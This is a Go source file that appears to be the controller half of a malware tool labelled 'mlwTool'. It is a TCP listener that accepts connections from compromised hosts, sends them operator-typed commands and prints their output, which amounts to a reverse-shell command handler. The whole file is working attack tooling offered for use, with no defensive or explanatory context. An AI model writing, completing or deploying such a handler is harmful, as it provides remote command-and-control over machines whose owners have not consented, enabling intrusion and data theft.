package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

// Constant declaration
const RHOST = "127.0.0.1" //Change to the dialer IP.
const RPORT = "6666"      //Change to the dialer Port.

// Code
func handleConn(c net.Conn) {
	defer c.Close()

	cmdReader := bufio.NewReader(c)
	stdinReader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("#mlwTool# RTCP >")
		cmd, _ := stdinReader.ReadString('\n')

		_, err := c.Write([]byte(cmd))

		if err != nil {

			if c == nil {
				fmt.Println("[!] Connection aborted [!]")
				return
			} else {
				fmt.Println("[!] An error ocurred.[!]")
				return
			}

		}

		response, _ := cmdReader.ReadString('\a')

		fmt.Println(response)

	}
}

func main() {
	ln, err := net.Listen("tcp", RHOST+":"+RPORT)
	if err != nil {
		fmt.Println("[!] Error while listening:", err)
		return
	}
	defer ln.Close()

	fmt.Println("[*] Listening... [*] ")

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("[!] Error accepting connection:", err)
			return
		}
		fmt.Println("[*] Connection accepted from:", conn.RemoteAddr())
		go handleConn(conn)
	}
}
